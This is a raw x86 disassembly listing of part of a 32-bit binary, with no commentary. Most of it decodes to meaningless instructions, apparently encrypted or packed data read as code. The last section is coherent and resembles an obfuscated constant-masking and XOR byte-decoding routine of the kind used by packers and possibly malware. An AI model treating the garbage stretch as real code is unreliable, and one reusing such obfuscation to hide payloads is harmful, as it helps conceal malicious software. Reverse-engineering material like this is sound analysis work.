  4058f9:	and    esp,DWORD PTR [edi+ebx*8-0x63]
  4058fd:	xchg   esi,eax
  4058fe:	xchg   ecx,eax
  4058ff:	or     DWORD PTR [edi+ebx*4+0x63],ebx
  405903:	and    bl,bl
  405905:	je     0x4058a0
  405907:	out    0xe4,al
  405909:	(bad)  
  40590a:	sub    eax,0xfc111fb2
  40590f:	push   ss
  405910:	adc    BYTE PTR [ecx-0x69b199f2],al
  405916:	adc    BYTE PTR [esi],ch
  405918:	mov    WORD PTR [edx],?
  40591a:	add    DWORD PTR [ecx+edi*2+0xeb8329e],0xffffffa0
  405922:	lock or ch,BYTE PTR [ebp-0x7b]
  405926:	lds    ecx,FWORD PTR [ebx-0x52fd92b5]
  40592c:	mov    cl,0x8b
  40592e:	cmp    eax,0x159fae7b
  405933:	arpl   bp,sp
  405935:	mov    ah,0x9c
  405937:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405938:	push   edi
  405939:	fwait
  40593a:	dec    ecx
  40593b:	xchg   ebx,ecx
  40593d:	add    al,0x95
  40593f:	fwait
  405940:	xchg   esi,eax
  405941:	(bad)  
  405942:	push   ebp
  405943:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405944:	fld    DWORD PTR [ecx]
  405946:	and    eax,0xa8f9ec50
  40594b:	popf   
  40594c:	mov    al,ds:0x396b5b31
  405951:	fimul  WORD PTR [esi-0x146200c7]
  405957:	adc    esp,DWORD PTR [edx+eiz*8]
  40595a:	push   0x51
  40595c:	sub    ah,ch
  40595e:	jo     0x4059b9
  405960:	xor    al,BYTE PTR [edx-0x6d6be5e8]
  405966:	inc    esp
  405967:	inc    esp
  405968:	mov    ?,WORD PTR [edx-0x1adbe501]
  40596e:	sub    dh,BYTE PTR [ebp-0x29b3ce02]
  405974:	das    
  405975:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405976:	pop    ebp
  405977:	ds mov edi,0x4b3dd532
  40597d:	pop    ebp
  40597e:	push   edi
  40597f:	call   0x7b13563a
  405984:	ds retf 
  405986:	or     eax,0xd007e3b2
  40598b:	or     eax,0x60608b4f
  405990:	pop    es
  405991:	xor    ecx,DWORD PTR [edx]
  405993:	out    0x9c,al
  405995:	push   esi
  405996:	xor    eax,0x915ebb53
  40599b:	popa   
  40599c:	call   0xd49b:0xe8ad94d9
  4059a3:	push   ss
  4059a4:	push   ds
  4059a5:	sbb    al,0xa8
  4059a7:	je     0x4059d4
  4059a9:	in     al,dx
  4059aa:	retf   0x1da8
  4059ad:	gs (bad) 
  4059af:	mov    ah,0xe7
  4059b1:	push   0x7710e882
  4059b6:	fs dec ebx
  4059b8:	mov    BYTE PTR [ecx+0x10],ch
  4059bb:	out    0xa4,eax
  4059bd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4059be:	adc    DWORD PTR [ebp-0xe5015de],esp
  4059c4:	jp     0x405a2a
  4059c6:	in     eax,dx
  4059c7:	jne    0x405a3a
  4059c9:	cmp    eax,0x723ad35b
  4059ce:	adc    esp,DWORD PTR [ecx]
  4059d0:	push   ebp
  4059d1:	out    dx,eax
  4059d2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4059d3:	arpl   WORD PTR [edi],si
  4059d5:	sub    esi,DWORD PTR [ecx+edx*2+0x7]
  4059d9:	(bad)  
  4059da:	jno    0x4059e2
  4059dc:	add    BYTE PTR [edx],0x45
  4059df:	add    BYTE PTR [ebp+0x700147fd],bl
  4059e5:	jle    0x4059e0
  4059e7:	fcomp  st(7)
  4059e9:	setbe  BYTE PTR [eax-0x3b]
  4059ed:	aam    0x87
  4059ef:	(bad)  
  4059f1:	loope  0x40597d
  4059f3:	lea    ecx,[ebx-0x5d]
  4059f6:	ins    BYTE PTR es:[edi],dx
  4059f7:	addr16 mov cl,0xe1
  4059fa:	and    eax,0x927e5a8e
  4059ff:	into   
  405a00:	xor    ecx,DWORD PTR [ebx+0x5f]
  405a03:	xor    ebx,edi
  405a05:	sahf   
  405a06:	test   al,0xa9
  405a08:	nop
  405a09:	std    
  405a0a:	inc    ebx
  405a0b:	cs push cs
  405a0d:	pop    edx
  405a0e:	test   BYTE PTR [edx+0x45],dh
  405a11:	sub    eax,0x9f05c87f
  405a16:	clc    
  405a17:	and    ch,BYTE PTR [ebx+0x7b]
  405a1a:	ja     0x405a08
  405a1c:	mov    ds:0x908b30c,eax
  405a21:	sub    BYTE PTR [edx-0x13],al
  405a24:	mov    al,0xf6
  405a26:	xchg   esp,eax
  405a27:	sub    al,0x25
  405a29:	push   ebp
  405a2a:	and    BYTE PTR [ebx],bh
  405a2c:	retf   
  405a2d:	aam    0x60
  405a2f:	call   0x6100130a
  405a34:	add    ebx,eax
  405a36:	jmp    0xb462:0xbf89b0df
  405a3d:	pop    ecx
  405a3e:	aaa    
  405a3f:	mov    bh,0x27
  405a41:	jp     0x4059c9
  405a43:	and    DWORD PTR [ebx+ebx*4],0xffffffc3
  405a47:	loopne 0x4059d5
  405a49:	cmp    DWORD PTR [eax+0x75],0x51
  405a4d:	stos   BYTE PTR es:[edi],al
  405a4e:	fcomp  DWORD PTR [eax+0x37c5818b]
  405a54:	test   DWORD PTR [ebp+0x4e],edx
  405a57:	push   ebx
  405a58:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405a59:	retf   
  405a5a:	scas   eax,DWORD PTR es:[edi]
  405a5b:	push   esp
  405a5c:	das    
  405a5d:	inc    eax
  405a5e:	xor    BYTE PTR [ecx],bl
  405a60:	xor    eax,DWORD PTR [edx+ecx*4+0x5]
  405a64:	test   eax,0xad89c66e
  405a69:	push   ss
  405a6a:	push   esp
  405a6b:	cld    
  405a6c:	ret    
  405a6d:	dec    esp
  405a6e:	retf   0x498b
  405a71:	mov    al,0xfe
  405a73:	test   BYTE PTR [esi*1-0x2a19f3a9],dl
  405a7a:	pop    ebx
  405a7b:	pop    ds
  405a7c:	add    eax,0xf7146f10
  405a81:	scas   al,BYTE PTR es:[edi]
  405a82:	xlat   BYTE PTR ds:[ebx]
  405a83:	mov    edx,0x2ccb9565
  405a88:	adc    bl,BYTE PTR [ebx-0x756b74f1]
  405a8e:	fwait
  405a8f:	xor    esi,0x41
  405a92:	add    eax,0xc5d6b476
  405a97:	or     cl,BYTE PTR [ecx-0x3b]
  405a9a:	add    eax,esp
  405a9c:	mov    al,ds:0x5d0f1603
  405aa1:	aaa    
  405aa2:	push   cs
  405aa3:	adc    BYTE PTR [ecx],0x25
  405aa6:	push   edi
  405aa7:	fldcw  WORD PTR [ebx]
  405aa9:	mov    ah,0x7a
  405aab:	pusha  
  405aac:	dec    ecx
  405aad:	call   DWORD PTR [edx+0x24dc2735]
  405ab3:	lock adc ah,cl
  405ab6:	push   edi
  405ab7:	sbb    al,0x31
  405ab9:	adc    dl,bh
  405abb:	in     eax,dx
  405abc:	push   ds
  405abd:	xlat   BYTE PTR ds:[ebx]
  405abe:	ret    0x2446
  405ac1:	loope  0x405a44
  405ac3:	popa   
  405ac4:	dec    ecx
  405ac5:	add    cl,BYTE PTR ss:[ebx+edi*8+0x58]
  405aca:	repz pusha 
  405acc:	lahf   
  405acd:	and    ecx,DWORD PTR [ecx-0x520f8f9c]
  405ad3:	sbb    BYTE PTR [ebp-0x44],0x51
  405ad7:	cmp    al,0x31
  405ad9:	scas   eax,DWORD PTR es:[edi]
  405ada:	mov    dl,0x60
  405adc:	outs   dx,BYTE PTR ds:[esi]
  405add:	jb     0x405ab0
  405adf:	daa    
  405ae0:	jmp    0x5452:0x31a14d1a
  405ae7:	pop    ds
  405ae8:	cmp    edi,DWORD PTR fs:[edx+0x28]
  405aec:	mov    bl,0x11
  405aee:	and    ecx,DWORD PTR [edx]
  405af0:	xor    BYTE PTR [edx+0x3c],ah
  405af3:	addr16 jg 0x405aa0
  405af6:	(bad)  
  405af7:	(bad)  
  405af8:	jmp    0xd50b:0x452f7a21
  405aff:	push   ss
  405b00:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405b01:	lahf   
  405b02:	add    bh,cl
  405b04:	rcl    ch,1
  405b06:	mov    bl,0xf
  405b08:	or     bl,BYTE PTR [ebp-0x494279ce]
  405b0e:	cdq    
  405b0f:	cmp    al,0xbd
  405b11:	mov    ah,0xfb
  405b13:	xchg   esi,eax
  405b14:	push   ecx
  405b15:	cmp    DWORD PTR [ebx-0x9],0xffffffd4
  405b19:	retf   0x14e6
  405b1c:	scas   eax,DWORD PTR es:[edi]
  405b1d:	mov    edi,ebx
  405b1f:	sub    eax,DWORD PTR [ecx+ebp*2]
  405b22:	add    eax,0xc85cc718
  405b27:	dec    ebx
  405b28:	or     ecx,0xffffffd8
  405b2b:	cld    
  405b2c:	hlt    
  405b2d:	and    al,BYTE PTR [edi+0x21d4ed28]
  405b33:	es push 0x7e
  405b36:	jmp    0x6806:0x69896cfb
  405b3d:	jp     0x405b3d
  405b3f:	jo     0x405b59
  405b41:	xor    ah,BYTE PTR [ecx]
  405b43:	sbb    DWORD PTR [edi-0x6b],edx
  405b46:	push   ebp
  405b47:	(bad)  
  405b48:	mov    al,ds:0xf3cce54e
  405b4d:	outs   dx,DWORD PTR ds:[esi]
  405b4e:	shl    BYTE PTR [edi+edx*4],0xb2
  405b52:	jmp    0x235f1cee
  405b57:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405b58:	scas   eax,DWORD PTR es:[edi]
  405b59:	xchg   edx,eax
  405b5a:	push   ebx
  405b5b:	aaa    
  405b5c:	jnp    0x405b61
  405b5e:	or     eax,0x2e4595f
  405b63:	out    dx,al
  405b64:	jg     0x405b38
  405b66:	adc    ebx,DWORD PTR [bp+si]
  405b69:	out    dx,al
  405b6a:	leave  
  405b6b:	mov    DWORD PTR es:[edi+ebp*8],esi
  405b6f:	pusha  
  405b70:	cwde   
  405b71:	in     al,dx
  405b72:	xchg   edx,eax
  405b73:	xchg   BYTE PTR ds:0xb74249a8,bh
  405b79:	push   esp
  405b7a:	nop
  405b7b:	push   0x2
  405b7d:	call   0x8857:0x9cf053f6
  405b84:	in     al,0x80
  405b86:	pop    eax
  405b87:	sahf   
  405b88:	xchg   esi,eax
  405b89:	jmp    0x143d:0x5ce44355
  405b90:	xchg   edx,eax
  405b91:	xor    al,0x89
  405b93:	adc    DWORD PTR [ebp-0x39],eax
  405b96:	dec    ecx
  405b97:	(bad)  
  405b9a:	in     eax,0x1c
  405b9c:	inc    ebx
  405b9d:	inc    eax
  405b9e:	(bad)  
  405b9f:	lods   eax,DWORD PTR ds:[esi]
  405ba0:	les    ebx,FWORD PTR ds:0x76bab692
  405ba6:	rol    BYTE PTR [edx+0x1c],cl
  405ba9:	jns    0x405b88
  405bab:	adc    esi,ecx
  405bad:	dec    ebp
  405bae:	mov    eax,ds:0x7caa8b39
  405bb3:	leave  
  405bb4:	in     eax,dx
  405bb5:	sbb    DWORD PTR [eax-0x68],esp
  405bb8:	nop
  405bb9:	lea    eax,[esi-0x51]
  405bbc:	pop    edx
  405bbd:	xchg   ebx,eax
  405bbe:	add    al,0x55
  405bc0:	jmp    0x405c22
  405bc2:	aad    0x20
  405bc4:	dec    edi
  405bc5:	les    edx,FWORD PTR [ebx]
  405bc7:	dec    ebp
  405bc8:	retf   0x1817
  405bcb:	out    dx,al
  405bcc:	inc    eax
  405bcd:	jp     0x405bf6
  405bcf:	es push eax
  405bd1:	sub    al,0x86
  405bd3:	fwait
  405bd4:	aaa    
  405bd5:	dec    esi
  405bd6:	in     eax,0x85
  405bd8:	push   cs
  405bd9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405bda:	ins    DWORD PTR es:[edi],dx
  405bdb:	xor    edx,DWORD PTR [edi+0x2b]
  405bde:	push   ebp
  405bdf:	outs   dx,BYTE PTR ds:[esi]
  405be0:	(bad)  
  405be1:	fisttp QWORD PTR [edx-0x49c02f8d]
  405be7:	rcr    BYTE PTR [edx+0x29c7c37f],cl
  405bed:	jmp    0x294567d
  405bf2:	inc    eax
  405bf3:	ja     0x405c0f
  405bf5:	jb     0x405c22
  405bf7:	mov    bh,0xc1
  405bf9:	fistp  QWORD PTR [eax+ecx*1+0x62a070a5]
  405c00:	js     0x405bca
  405c02:	fistp  DWORD PTR [esi+eiz*2+0xfe8449]
  405c09:	sub    BYTE PTR ds:0x61f40700,dl
  405c0f:	sub    eax,0x1658cff9
  405c14:	cmc    
  405c15:	in     al,0xe4
  405c17:	cdq    
  405c18:	or     DWORD PTR [ebx],0xffffffee
  405c1b:	fcom   st(1)
  405c1d:	push   esi
  405c1e:	pop    es
  405c1f:	imul   eax,DWORD PTR [eax],0xa67c7881
  405c25:	mov    edx,0x5d18bdf3
  405c2a:	add    eax,0x711fcf5b
  405c2f:	xor    DWORD PTR [ecx+0x1],edi
  405c32:	xchg   ebx,eax
  405c33:	jl     0x405c2d
  405c35:	in     eax,0x43
  405c37:	dec    ecx
  405c38:	dec    ecx
  405c39:	or     DWORD PTR [esi-0x66d40580],edi
  405c3f:	hlt    
  405c40:	xchg   esi,eax
  405c41:	sub    BYTE PTR [edx-0x4bd80054],dh
  405c47:	test   DWORD PTR [ebx],ebp
  405c49:	(bad)
  405c4d:	lahf   
  405c4e:	mov    bl,0xc3
  405c50:	popf   
  405c51:	pushf  
  405c52:	pop    ebx
  405c53:	loopne 0x405c72
  405c55:	and    eax,0x4001e71b
  405c5a:	inc    ebx
  405c5b:	shr    BYTE PTR [esi-0x79c8ce3f],1
  405c61:	sub    BYTE PTR [edi],dh
  405c63:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405c64:	mov    al,0x71
  405c66:	push   ebp
  405c67:	push   edx
  405c68:	mov    cl,0x8b
  405c6a:	and    eax,0x39dc233a
  405c6f:	xchg   ebx,eax
  405c70:	jae    0x405ce3
  405c72:	cmp    eax,0xe16bfc6e
  405c77:	and    bl,BYTE PTR [ebx+ebp*2+0x62344ba9]
  405c7e:	fsubr  DWORD PTR [esi]
  405c80:	mov    dl,0x18
  405c82:	jp     0x405c57
  405c84:	mov    ch,bl
  405c86:	sbb    al,0xe2
  405c88:	gs sahf 
  405c8a:	sbb    al,0x93
  405c8c:	cdq    
  405c8d:	and    al,0xf7
  405c8f:	inc    eax
  405c90:	xor    DWORD PTR [edx+0x53],ebx
  405c93:	cli    
  405c94:	xchg   edi,ebp
  405c96:	adc    eax,0x15201249
  405c9b:	test   al,0x61
  405c9d:	test   eax,0xab387506
  405ca2:	sar    DWORD PTR [ebp-0x102d0ad1],cl
  405ca8:	mov    edi,0x50e1cc7d
  405cad:	sub    DWORD PTR [esi+0x36],esi
  405cb0:	jae    0x405c73
  405cb2:	pop    es
  405cb3:	push   ebx
  405cb4:	xchg   ecx,eax
  405cb5:	repz repz and eax,0x56c8f1c7
  405cbc:	test   eax,0x9ad7d05c
  405cc1:	mov    ds:0xc3f6bbe7,eax
  405cc6:	jo     0x405cfd
  405cc8:	xchg   esi,eax
  405cc9:	pushf  
  405cca:	mov    ebx,0xb6dd7eec
  405ccf:	fstp   TBYTE PTR [edi+0x1f96e46c]
  405cd5:	fimul  WORD PTR [ecx-0x45]
  405cd8:	jecxz  0x405d39
  405cda:	push   eax
  405cdb:	mov    ebp,0x141aa6d5
  405ce0:	xor    al,0xfe
  405ce2:	mov    dh,0xa3
  405ce4:	xor    dl,bh
  405ce6:	sub    ch,ah
  405ce8:	push   esi
  405ce9:	ins    DWORD PTR es:[edi],dx
  405cea:	pop    ebx
  405ceb:	dec    esi
  405cec:	fnsave [ebx-0x46eaff99]
  405cf2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405cf3:	inc    edx
  405cf4:	ins    BYTE PTR es:[edi],dx
  405cf5:	ja     0x405c91
  405cf7:	jmp    0x405d61
  405cf9:	mov    edi,0x908ecc25
  405cfe:	pop    esp
  405cff:	addr16 inc edi
  405d01:	test   ch,dh
  405d03:	enter  0x36c9,0x82
  405d07:	(bad)  
  405d08:	fld    QWORD PTR ds:0xdb6a0a82
  405d0e:	sub    ah,BYTE PTR [edi+0x3c210598]
  405d14:	arpl   WORD PTR [esi-0x25a471aa],cx
  405d1a:	(bad)  
  405d1b:	sub    ch,dl
  405d1d:	int    0x7d
  405d1f:	retf   0x5a65
  405d22:	sahf   
  405d23:	and    DWORD PTR [edi+ebp*8-0x3f],0x62
  405d28:	push   esi
  405d29:	stc    
  405d2a:	add    eax,esp
  405d2c:	popf   
  405d2d:	nop
  405d2e:	stc    
  405d2f:	test   DWORD PTR [edi+edx*1+0x44],ebx
  405d33:	ins    DWORD PTR es:[edi],dx
  405d34:	sub    al,0x90
  405d36:	scas   eax,DWORD PTR es:[edi]
  405d37:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405d38:	jmp    0x405cd9
  405d3a:	sub    eax,0x46de0965
  405d3f:	rol    ch,1
  405d41:	outs   dx,DWORD PTR ds:[esi]
  405d42:	nop
  405d43:	push   ds
  405d44:	cmp    dl,BYTE PTR [eax-0x48286376]
  405d4a:	sbb    ah,BYTE PTR [edi+eax*2-0x48]
  405d4e:	sub    bl,ah
  405d50:	out    dx,eax
  405d51:	pop    esp
  405d52:	dec    ebp
  405d53:	jae    0x405dbb
  405d55:	lds    esi,FWORD PTR ds:0xd6dc2449
  405d5b:	mov    ah,ah
  405d5d:	push   eax
  405d5e:	jns    0x405da6
  405d60:	xor    eax,0xa8530edf
  405d65:	test   BYTE PTR [ebp-0x3d1d8740],dl
  405d6b:	neg    DWORD PTR [eax-0x6c]
  405d6e:	ja     0x405d1c
  405d70:	daa    
  405d71:	jg     0x405cf7
  405d73:	xchg   ecx,eax
  405d74:	xchg   ebp,eax
  405d75:	push   esp
  405d76:	pop    esi
  405d77:	xchg   esp,eax
  405d78:	pop    ds
  405d79:	xchg   BYTE PTR [edx],cl
  405d7b:	or     ebp,ebp
  405d7d:	popa   
  405d7e:	ins    BYTE PTR es:[edi],dx
  405d7f:	icebp  
  405d80:	ja     0x405dea
  405d82:	pop    ss
  405d83:	aas    
  405d84:	fnstcw WORD PTR [esi+edx*2-0x4e99137]
  405d8b:	jns    0x405d42
  405d8d:	xlat   BYTE PTR ds:[ebx]
  405d8e:	popf   
  405d8f:	hlt    
  405d90:	dec    ebp
  405d91:	lea    esi,[eax+0x1d]
  405d94:	mov    edx,0x1dd5615c
  405d99:	loop   0x405d7b
  405d9b:	loop   0x405e01
  405d9d:	lock jmp FWORD PTR [edi+0x1f]
  405da1:	sti    
  405da2:	mov    esi,0xdd3a6109
  405da7:	fstp   TBYTE PTR [eax+0x373d8d2]
  405dad:	mov    bl,0x3e
  405daf:	xchg   esi,eax
  405db0:	fwait
  405db1:	(bad)  
  405db2:	and    al,0xdb
  405db4:	push   esi
  405db5:	pop    esi
  405db6:	sbb    eax,0x97cd0eb
  405dbb:	lahf   
  405dbc:	ja     0x405e22
  405dbe:	and    DWORD PTR [edx-0x2e],esi
  405dc1:	(bad)  ds:0x11f33992
  405dc7:	sub    eax,0x36c716ff
  405dcc:	(bad)  
  405dcf:	jp     0x405e20
  405dd1:	inc    edx
  405dd2:	out    dx,al
  405dd3:	call   0x3da:0xda4a742c
  405dda:	fs push ebp
  405ddc:	mov    BYTE PTR [edi+edi*1],dl
  405ddf:	cmp    eax,0x51199aad
  405de4:	sbb    bl,BYTE PTR [edx+0x38]
  405de7:	sbb    BYTE PTR [ebx+0x18],al
  405dea:	leave  
  405deb:	push   edi
  405dec:	stos   DWORD PTR es:[edi],eax
  405ded:	mov    BYTE PTR [ebx+0x78],al
  405df0:	enter  0xb4b4,0x1c
  405df4:	mov    BYTE PTR [ebp+0x49c04263],bh
  405dfa:	test   ch,0xd5
  405dfd:	push   eax
  405dfe:	pop    edi
  405dff:	repz sbb eax,0xc00dbf93
  405e05:	shl    DWORD PTR [edx+0x48],0x45
  405e09:	vsubps ymm0,ymm4,YMMWORD PTR [esi+0x6259edf1]
  405e11:	data16 int 0x0
  405e14:	inc    ebp
  405e15:	loop   0x405e8c
  405e17:	repnz stos DWORD PTR es:[edi],eax
  405e19:	(bad)  
  405e1b:	mov    ecx,0xd6f4b66a
  405e20:	enter  0x21ec,0xf8
  405e24:	scas   eax,DWORD PTR es:[edi]
  405e25:	or     esp,DWORD PTR [eax]
  405e27:	mov    WORD PTR [eax-0x58],ds
  405e2a:	pop    ds
  405e2b:	cmp    ecx,DWORD PTR [ebx]
  405e2d:	addr16 loop 0x405e22
  405e30:	or     ebx,DWORD PTR [ecx-0x6a]
  405e33:	call   0x9d2b:0xf0a4dda1
  405e3a:	mov    ebx,0x41fbba0b
  405e3f:	imul   esp,esi,0x19e7066e
  405e45:	jo     0x405eb6
  405e47:	mov    esp,edi
  405e49:	ja     0x405e1e
  405e4b:	outs   dx,BYTE PTR ds:[esi]
  405e4c:	xor    bh,0x80
  405e4f:	fbld   TBYTE PTR gs:[edx-0x18]
  405e53:	sub    al,0xe7
  405e55:	mov    ecx,0xa6bbcb27
  405e5a:	addr16 pusha 
  405e5c:	js     0x405df3
  405e5e:	out    0x6e,eax
  405e60:	sbb    bh,BYTE PTR [eax-0x42]
  405e63:	int    0x13
  405e65:	lahf   
  405e66:	in     eax,0x59
  405e68:	and    al,cl
  405e6a:	push   edx
  405e6b:	xor    DWORD PTR [edi+0x431c90db],edi
  405e71:	fsub   DWORD PTR [edx+ecx*8+0x67]
  405e75:	dec    esp
  405e76:	and    eax,0x22551d6d
  405e7b:	or     al,0x2b
  405e7d:	dec    BYTE PTR [edx]
  405e7f:	dec    esi
  405e80:	mov    BYTE PTR [esi+0x1b],bl
  405e83:	in     al,0x88
  405e85:	pop    ds
  405e86:	push   es
  405e87:	mov    ah,0xd8
  405e89:	aad    0xf9
  405e8b:	rcl    dh,1
  405e8d:	add    esi,DWORD PTR [ebp-0xdf5fae]
  405e93:	dec    esp
  405e94:	dec    edx
  405e95:	(bad)  
  405e96:	push   0x8b02924c
  405e9b:	pop    esi
  405e9c:	pop    ecx
  405e9d:	into   
  405e9e:	mov    ch,0x2b
  405ea0:	xor    al,0x3e
  405ea2:	loopne 0x405f11
  405ea4:	rol    BYTE PTR [ebx],1
  405ea6:	xchg   edx,eax
  405ea7:	or     DWORD PTR [ebx-0x5f2c7139],eax
  405ead:	rol    BYTE PTR [esi+0x41053f07],1
  405eb3:	popf   
  405eb4:	mov    dh,0xa4
  405eb6:	dec    esp
  405eb7:	pop    edx
  405eb8:	xlat   BYTE PTR ds:[ebx]
  405eb9:	pop    ebx
  405eba:	cld    
  405ebb:	bound  ebx,QWORD PTR [edi+edx*1+0x1ceca59d]
  405ec2:	popa   
  405ec3:	add    ebx,ebx
  405ec5:	lods   al,BYTE PTR ds:[esi]
  405ec6:	cwde   
  405ec7:	pop    ebx
  405ec8:	jno    0x405e61
  405eca:	or     al,0x1d
  405ecc:	out    dx,al
  405ecd:	loopne 0x405e6f
  405ecf:	sti    
  405ed0:	pop    edx
  405ed1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405ed2:	pop    ds
  405ed3:	jbe    0x405ea9
  405ed5:	pop    ebp
  405ed6:	pop    ds
  405ed7:	daa    
  405ed8:	sahf   
  405ed9:	sub    al,0x3f
  405edb:	push   esp
  405edc:	adc    DWORD PTR [ebp+0x17],ecx
  405edf:	push   ebp
  405ee0:	(bad)  
  405ee1:	adc    DWORD PTR [eax-0x45],eax
  405ee4:	push   0xffffffd0
  405ee6:	cmp    BYTE PTR [ecx+0x43],ah
  405ee9:	jno    0x405f29
  405eeb:	int3   
  405eec:	xchg   ebp,eax
  405eed:	pop    ds
  405eee:	ja     0x405f1e
  405ef0:	jl     0x405e97
  405ef2:	or     DWORD PTR [eax],esp
  405ef4:	jge    0x405f69
  405ef6:	and    al,0x3c
  405ef8:	mov    al,ds:0x8ad9e89a
  405efd:	adc    eax,0xb261437
  405f02:	je     0x405ef2
  405f04:	pusha  
  405f05:	and    ah,BYTE PTR [edi+0x42]
  405f08:	and    DWORD PTR [eax],ebx
  405f0a:	sbb    ebx,ebp
  405f0c:	and    al,0x9f
  405f0e:	or     eax,0xeb32e277
  405f13:	call   0x1643:0xcdad6bfa
  405f1a:	dec    edx
  405f1b:	rcr    DWORD PTR [eax-0x48],0xcc
  405f1f:	mov    ebx,0xf768f39c
  405f24:	js     0x405f98
  405f26:	(bad)  
  405f27:	xor    cl,ch
  405f29:	sbb    ah,bl
  405f2b:	retf   
  405f2c:	mov    al,0x56
  405f2e:	pop    DWORD PTR ds:0x9a55c2a2
  405f34:	jle    0x405eca
  405f36:	sub    al,0xbe
  405f38:	and    DWORD PTR [eax],ecx
  405f3a:	fnstcw WORD PTR [ebx+0x35]
  405f3d:	push   0xffffffc4
  405f3f:	mov    ebx,0x6c469b47
  405f44:	call   0x45ca02d7
  405f49:	aam    0x8b
  405f4b:	inc    ebp
  405f4c:	test   al,0x2b
  405f4e:	ror    DWORD PTR [ecx+0x458be445],0xe4
  405f55:	mov    DWORD PTR [ebp-0x14],eax
  405f58:	mov    eax,DWORD PTR [ebp-0x2c]
  405f5b:	mov    DWORD PTR [ebp-0x38],0xf89c85b5
  405f62:	mov    DWORD PTR [ebp-0x54],eax
  405f65:	mov    DWORD PTR [ebp-0x20],0xf89c85b4
  405f6c:	mov    eax,DWORD PTR [ebp-0x38]
  405f6f:	xor    eax,esi
  405f71:	add    eax,edi
  405f73:	mov    DWORD PTR [ebp-0x10],eax
  405f76:	mov    eax,DWORD PTR [ebp-0x38]
  405f79:	xor    eax,esi
  405f7b:	add    eax,edi
  405f7d:	mov    DWORD PTR [ebp-0x8],eax
  405f80:	mov    DWORD PTR [ebp-0x2c],0xf89c8595
  405f87:	mov    DWORD PTR [ebp-0x44],0xf89c85be
  405f8e:	mov    eax,DWORD PTR [ebp-0x38]
  405f91:	mov    edx,DWORD PTR [ebp-0x14]
  405f94:	xor    eax,esi
  405f96:	add    eax,edi
  405f98:	cmp    edx,eax
  405f9a:	je     0x40852b
  405fa0:	mov    eax,DWORD PTR [ebp-0x20]
  405fa3:	xor    eax,esi
  405fa5:	mov    edx,0xffcd8d06
  405faa:	sub    edx,eax
  405fac:	add    edx,DWORD PTR [ebp-0x14]
  405faf:	mov    eax,DWORD PTR [ebp-0x20]
  405fb2:	mov    ebx,DWORD PTR [ebp-0x10]
  405fb5:	xor    eax,esi
  405fb7:	add    eax,edi
  405fb9:	imul   eax,ebx
  405fbc:	cmp    eax,edx
  405fbe:	ja     0x408528
  405fc4:	mov    edx,DWORD PTR [ebp-0x10]
  405fc7:	mov    eax,DWORD PTR [ebp-0x14]
  405fca:	mov    ebx,DWORD PTR [ebp-0x2c]
  405fcd:	sub    eax,edx
  405fcf:	xor    ebx,esi
  405fd1:	xor    edx,edx
  405fd3:	add    ebx,edi
  405fd5:	div    ebx
  405fd7:	mov    DWORD PTR [ebp-0x8],eax
  405fda:	mov    eax,DWORD PTR [ebp-0x44]
  405fdd:	mov    edx,DWORD PTR [ebp-0x8]
  405fe0:	xor    eax,esi
  405fe2:	add    eax,edi
  405fe4:	cmp    edx,eax
  405fe6:	jbe    0x405ff6
  405fec:	mov    eax,DWORD PTR [ebp-0x44]
  405fef:	xor    eax,esi
  405ff1:	add    eax,edi
  405ff3:	mov    DWORD PTR [ebp-0x8],eax
  405ff6:	mov    eax,DWORD PTR [ebp-0x2c]
  405ff9:	mov    edx,DWORD PTR [ebp-0x8]
  405ffc:	xor    eax,esi
  405ffe:	add    eax,edi
  406000:	imul   eax,edx
  406003:	mov    DWORD PTR [ebp-0x8],eax
  406006:	mov    eax,DWORD PTR [ebp-0x38]
  406009:	mov    edx,DWORD PTR [ebp-0x8]
  40600c:	xor    eax,esi
  40600e:	add    eax,edi
  406010:	cmp    edx,eax
  406012:	je     0x408511
  406018:	mov    eax,DWORD PTR [ebp-0x8]
  40601b:	mov    DWORD PTR [ebp-0x18],eax
  40601e:	mov    eax,DWORD PTR [ebp-0x10]
  406021:	add    eax,DWORD PTR [ebp-0x54]
  406024:	mov    DWORD PTR [ebp-0x1c],0xf89c85b5
  40602b:	mov    DWORD PTR [ebp-0x8],eax
  40602e:	mov    eax,0xf89c85b4
  406033:	mov    DWORD PTR [ebp-0x28],eax
  406036:	mov    DWORD PTR [ebp-0x5c],0xf89c85bb
  40603d:	mov    DWORD PTR [ebp-0x40],0xf89c85ba
  406044:	mov    DWORD PTR [ebp-0x30],eax
  406047:	mov    eax,DWORD PTR [ebp-0x1c]
  40604a:	xor    eax,esi
  40604c:	add    eax,edi
  40604e:	jmp    0x4084cd
  406053:	mov    DWORD PTR [ebp-0x4c],0xf89c85a2
  40605a:	mov    DWORD PTR [ebp-0x50],0xf89c85af
  406061:	mov    eax,DWORD PTR [ebp-0x30]
  406064:	mov    edx,DWORD PTR [ebp-0xc]
  406067:	xor    eax,esi
  406069:	add    eax,edi
  40606b:	imul   eax,edx
  40606e:	mov    edx,DWORD PTR [ebp-0x8]
  406071:	mov    al,BYTE PTR [eax+edx*1]
  406074:	mov    BYTE PTR [ebp-0x1],al
  406077:	mov    eax,DWORD PTR [ebp-0x30]
  40607a:	mov    edx,DWORD PTR [ebp-0xc]
  40607d:	xor    eax,esi
  40607f:	add    eax,edi
  406081:	imul   eax,edx
  406084:	mov    edx,DWORD PTR [ebp-0x5c]
  406087:	xor    edx,esi
  406089:	add    eax,edx
  40608b:	mov    edx,DWORD PTR [ebp-0x8]
  40608e:	movzx  eax,BYTE PTR [eax+edx*1+0x3272fa]
  406096:	mov    edx,DWORD PTR [ebp-0x4c]
  406099:	xor    edx,esi
  40609b:	lea    eax,[edx+eax*1+0x3272fa]
  4060a2:	movzx  edx,BYTE PTR [ebp-0x1]
  4060a6:	xor    edx,eax
  4060a8:	mov    BYTE PTR [ebp-0x1],dl
